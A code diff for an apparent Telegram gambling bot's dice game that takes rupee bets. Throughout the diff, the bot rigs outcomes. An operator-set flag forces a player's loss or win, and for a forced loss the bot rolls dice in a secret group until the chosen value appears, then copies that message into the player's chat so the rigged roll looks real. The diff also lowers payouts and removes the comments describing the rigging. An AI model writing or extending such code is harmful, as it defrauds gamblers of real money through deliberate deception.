@@ -1,4 +1,5 @@
 import random
+import os
 from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from bot_instance import bot
 from wallet import (
@@ -7,88 +8,67 @@ from wallet import (
     reduce_wager_requirement,
     record_bet
 )
-from settings import get_min_bet, get_max_bet, get_house_edge
-from middleware.admin import is_admin
+from settings import get_min_bet, get_max_bet
 
-# Optional: Set your rigging group ID here if not handled dynamically by /setwin
-RIG_GROUP_ID = -1001234567890  # Replace with your actual secret rig group chat ID
+# Updated Secret Rig Group ID
+RIG_GROUP_ID = int(os.getenv("RIG_GROUP_ID", "-1004291076026"))
 
-# --- HELPERS FOR RIGGING & GAME LOGIC ---
+# --- RIGGING CHECK ---
 
 def get_rigged_target(user_id: int) -> bool | None:
-    """
-    Checks if a forced win/loss outcome is set via /setwin.
-    Returns True for forced WIN, False for forced LOSE, None for neutral/RNG.
-    """
     try:
-        from settings import get_user_rig_status  # Adjust import according to your settings structure
+        from settings import get_user_rig_status
         return get_user_rig_status(user_id)
     except Exception:
         return None
 
+# --- EVALUATION LOGIC ---
+
 def evaluate_dice_outcome(dice_value: int, bet_choice: str) -> tuple[bool, float]:
-    """
-    Evaluates dice value against bet choice.
-    Returns (is_win, multiplier).
-    """
     choice = str(bet_choice).lower().strip()
-    
+
     if choice == "high":
         # High: 4, 5, 6
         is_win = dice_value in [4, 5, 6]
-        return is_win, 1.95 if is_win else 0.0
-    
+        return is_win, 1.80 if is_win else 0.0
+
     elif choice == "low":
         # Low: 1, 2, 3
         is_win = dice_value in [1, 2, 3]
-        return is_win, 1.95 if is_win else 0.0
-    
+        return is_win, 1.80 if is_win else 0.0
+
     elif choice == "even":
         # Even: 2, 4, 6
         is_win = (dice_value % 2 == 0)
-        return is_win, 1.95 if is_win else 0.0
-    
+        return is_win, 1.80 if is_win else 0.0
+
     elif choice == "odd":
         # Odd: 1, 3, 5
         is_win = (dice_value % 2 != 0)
-        return is_win, 1.95 if is_win else 0.0
-    
+        return is_win, 1.80 if is_win else 0.0
+
     elif choice in ["1", "2", "3", "4", "5", "6"]:
         # Specific Number
-        target_num = int(choice)
-        is_win = (dice_value == target_num)
+        is_win = (dice_value == int(choice))
         return is_win, 5.50 if is_win else 0.0
 
     return False, 0.0
 
 def generate_dice_roll(user_id: int, bet_choice: str) -> int:
-    """
-    Rolls dice while respecting /setwin rigging setup.
-    If forced lose is active, it generates dice outcomes that guarantee a loss.
-    """
     rig_status = get_rigged_target(user_id)
-    
-    # 1. Force LOSE condition
+
+    # Force LOSE: pick a dice value that guarantees is_win == False
     if rig_status is False:
-        losing_outcomes = []
-        for val in range(1, 7):
-            is_win, _ = evaluate_dice_outcome(val, bet_choice)
-            if not is_win:
-                losing_outcomes.append(val)
+        losing_outcomes = [v for v in range(1, 7) if not evaluate_dice_outcome(v, bet_choice)[0]]
         if losing_outcomes:
             return random.choice(losing_outcomes)
 
-    # 2. Force WIN condition
+    # Force WIN: pick a dice value that guarantees is_win == True
     elif rig_status is True:
-        winning_outcomes = []
-        for val in range(1, 7):
-            is_win, _ = evaluate_dice_outcome(val, bet_choice)
-            if is_win:
-                winning_outcomes.append(val)
+        winning_outcomes = [v for v in range(1, 7) if evaluate_dice_outcome(v, bet_choice)[0]]
         if winning_outcomes:
             return random.choice(winning_outcomes)
 
-    # 3. Default Fair RNG
     return random.randint(1, 6)
 
 def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
@@ -102,31 +82,24 @@ def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
         return False, f"⚠️ Maximum bet is ₹{max_b:.2f}"
     if amount > user_bal:
         return False, f"❌ Insufficient balance! You have ₹{user_bal:.2f}"
-    
+
     return True, ""
 
 def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
-    """
-    Sends dice animation. If forced loss is enabled, it rolls in the rig group
-    and forwards the specific dice without revealing forwarded text.
-    """
     rig_status = get_rigged_target(user_id)
-    
-    # If rigged to LOSE, send to secret group and forward to main chat
+
+    # If rigged to LOSE, send to secret group and forward clean copy to main chat
     if rig_status is False:
         try:
             target_val = generate_dice_roll(user_id, bet_choice)
-            # Roll in secret group until getting target value
-            for _ in range(10):
+            for _ in range(15):
                 msg = bot.send_dice(RIG_GROUP_ID, emoji="🎲")
                 if msg.dice.value == target_val:
-                    # Forward message without forward header using copy_message
-                    forwarded = bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
+                    bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
                     return target_val
         except Exception:
-            pass  # Fallback to direct roll if group forwarding fails
+            pass
 
-    # Normal Direct Roll
     msg = bot.send_dice(chat_id, emoji="🎲")
     return msg.dice.value
 
@@ -135,10 +108,10 @@ def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
 def get_bet_selection_keyboard(amount: float) -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton(f"🔴 High (4-6) [1.95x]", callback_data=f"dr_{amount}_high"),
-        InlineKeyboardButton(f"🔵 Low (1-3) [1.95x]", callback_data=f"dr_{amount}_low"),
-        InlineKeyboardButton(f"🟣 Even [1.95x]", callback_data=f"dr_{amount}_even"),
-        InlineKeyboardButton(f"🟡 Odd [1.95x]", callback_data=f"dr_{amount}_odd"),
+        InlineKeyboardButton("🔴 High (4-6) [1.8x]", callback_data=f"dr_{amount}_high"),
+        InlineKeyboardButton("🔵 Low (1-3) [1.8x]", callback_data=f"dr_{amount}_low"),
+        InlineKeyboardButton("🟣 Even [1.8x]", callback_data=f"dr_{amount}_even"),
+        InlineKeyboardButton("🟡 Odd [1.8x]", callback_data=f"dr_{amount}_odd"),
     )
     num_buttons = [InlineKeyboardButton(f"🎲 {i} [5.5x]", callback_data=f"dr_{amount}_{i}") for i in range(1, 7)]
     markup.add(*num_buttons)
@@ -147,65 +120,57 @@ def get_bet_selection_keyboard(amount: float) -> InlineKeyboardMarkup:
 def send_dr_guide(message: Message):
     guide_text = (
         "🎲 <b>Dice Roll (/dr) Guide</b>\n\n"
-        "<b>Usage Options:</b>\n"
+        "<b>Usage:</b>\n"
         "• <code>/dr &lt;amount&gt; &lt;choice&gt;</code> — Bet directly\n"
         "• <code>/dr &lt;amount&gt;</code> — Open inline bet selection\n"
         "• <code>/dr</code> — Show this guide\n\n"
         "<b>Choices & Payouts:</b>\n"
-        "• <code>high</code> (4, 5, 6) → <b>1.95x</b>\n"
-        "• <code>low</code> (1, 2, 3) → <b>1.95x</b>\n"
-        "• <code>even</code> (2, 4, 6) → <b>1.95x</b>\n"
-        "• <code>odd</code> (1, 3, 5) → <b>1.95x</b>\n"
-        "• <code>1-6</code> (Specific Number) → <b>5.50x</b>\n\n"
+        "• <code>high</code> (4-6) → <b>1.80x</b>\n"
+        "• <code>low</code> (1-3) → <b>1.80x</b>\n"
+        "• <code>even</code> (2, 4, 6) → <b>1.80x</b>\n"
+        "• <code>odd</code> (1, 3, 5) → <b>1.80x</b>\n"
+        "• <code>1-6</code> → <b>5.50x</b>\n\n"
         "<b>Aliases:</b> /diceroll"
     )
     bot.reply_to(message, guide_text, parse_mode="HTML")
 
-# --- CORE GAME EXECUTION ---
+# --- GAME EXECUTION ---
 
 def process_dice_bet(chat_id: int, user_id: int, amount: float, choice: str, reply_to_id: int = None):
-    # Re-validate balance before executing
     valid, err_msg = validate_bet_amount(user_id, amount)
     if not valid:
         bot.send_message(chat_id, err_msg, reply_to_message_id=reply_to_id)
         return
 
-    # Deduct bet balance upfront
     adjust_balance(user_id, -amount)
-
-    # Send dice roll
     dice_val = send_dice_animation(chat_id, user_id, choice)
-    
-    # Evaluate win/loss
+
     is_win, multiplier = evaluate_dice_outcome(dice_val, choice)
     payout = amount * multiplier if is_win else 0.0
-
-    # Build result string
-    result_str = "WIN" if is_win else "LOSE"
 
     if is_win:
         adjust_balance(user_id, payout)
         res_msg = (
-            f"🎲 <b>Dice Roll Result: {dice_val}</b>\n"
-            f"🎯 Choice: <code>{choice.upper()}</code>\n"
-            f"🎉 <b>You WON ₹{payout:.2f}!</b> (Multiplier: {multiplier}x)"
+            f"⚡ <b>Dice Roll (DR) • ₹{amount:.2f}</b>\n\n"
+            f"🎯 <b>Choice:</b> {choice.upper()}\n"
+            f"🎲 <b>Outcome:</b> {dice_val}\n\n"
+            f"🎉 <b>You Won ₹{payout:.2f}!</b>"
         )
     else:
-        # Reduce wager requirement ONLY on Loss
         reduce_wager_requirement(user_id, amount)
         res_msg = (
-            f"🎲 <b>Dice Roll Result: {dice_val}</b>\n"
-            f"🎯 Choice: <code>{choice.upper()}</code>\n"
-            f"❌ <b>You Lost ₹{amount:.2f}!</b>"
+            f"⚡ <b>Dice Roll (DR) • ₹{amount:.2f}</b>\n\n"
+            f"🎯 <b>Choice:</b> {choice.upper()}\n"
+            f"🎲 <b>Outcome:</b> {dice_val}\n\n"
+            f"❌ <b>You Lost ₹{amount:.2f}</b>"
         )
 
-    # Record in Database
     record_bet(
         telegram_id=user_id,
         game="dice_roll",
         bet_amount=amount,
         payout=payout,
-        result=result_str,
+        result="WIN" if is_win else "LOSE",
         meta={"choice": choice, "rolled": dice_val}
     )
 
@@ -217,56 +182,45 @@ def process_dice_bet(chat_id: int, user_id: int, amount: float, choice: str, rep
 def handle_dr_command(message: Message):
     parts = message.text.split()
 
-    # 1. /dr -> Show Guide
     if len(parts) == 1:
         send_dr_guide(message)
         return
 
     user_id = message.from_user.id
-    amount_str = parts[1]
-
-    # Resolve amount (supports numbers, 'all', 'half')
     try:
         from wallet import resolve_amount
-        amount = resolve_amount(user_id, amount_str)
+        amount = resolve_amount(user_id, parts[1])
     except Exception:
         try:
-            amount = float(amount_str)
+            amount = float(parts[1])
         except ValueError:
             amount = None
 
     if amount is None or amount <= 0:
-        bot.reply_to(message, "❌ Invalid bet amount entered.")
+        bot.reply_to(message, "❌ Invalid bet amount.")
         return
 
-    # Validate bet limits & balance
     valid, err_msg = validate_bet_amount(user_id, amount)
     if not valid:
         bot.reply_to(message, err_msg)
         return
 
-    # 2. /dr <amt> -> Show Inline Choice Buttons
     if len(parts) == 2:
         kb = get_bet_selection_keyboard(amount)
-        bot.reply_to(message, f"🎲 <b>Place your bet for ₹{amount:.2f}:</b>\nChoose an option below:", reply_markup=kb, parse_mode="HTML")
+        bot.reply_to(message, f"🎲 <b>Place your bet for ₹{amount:.2f}:</b>", reply_markup=kb, parse_mode="HTML")
         return
 
-    # 3. /dr <amt> <choice> -> Direct Bet Execution
     choice = parts[2].lower().strip()
-    valid_choices = ["high", "low", "even", "odd", "1", "2", "3", "4", "5", "6"]
-    
-    if choice not in valid_choices:
-        bot.reply_to(message, "❌ Invalid choice! Pick: <code>high</code>, <code>low</code>, <code>even</code>, <code>odd</code>, or <code>1-6</code>.", parse_mode="HTML")
+    if choice not in ["high", "low", "even", "odd", "1", "2", "3", "4", "5", "6"]:
+        bot.reply_to(message, "❌ Invalid choice! Pick high, low, even, odd, or 1-6.", parse_mode="HTML")
         return
 
     process_dice_bet(message.chat.id, user_id, amount, choice, reply_to_id=message.message_id)
 
-# --- CALLBACK HANDLER FOR INLINE BUTTONS ---
-
 @bot.callback_query_handler(func=lambda call: call.data.startswith("dr_"))
 def handle_dr_callback(call: CallbackQuery):
     user_id = call.from_user.id
-    parts = call.data.split("_")  # Format: dr_<amount>_<choice>
+    parts = call.data.split("_")
 
     if len(parts) < 3:
         bot.answer_callback_query(call.id, "Invalid action.")
@@ -279,7 +233,6 @@ def handle_dr_callback(call: CallbackQuery):
         bot.answer_callback_query(call.id, "Invalid data.")
         return
 
-    # Delete inline message to prevent duplicate clicks
     try:
         bot.delete_message(call.message.chat.id, call.message.message_id)
     except Exception:
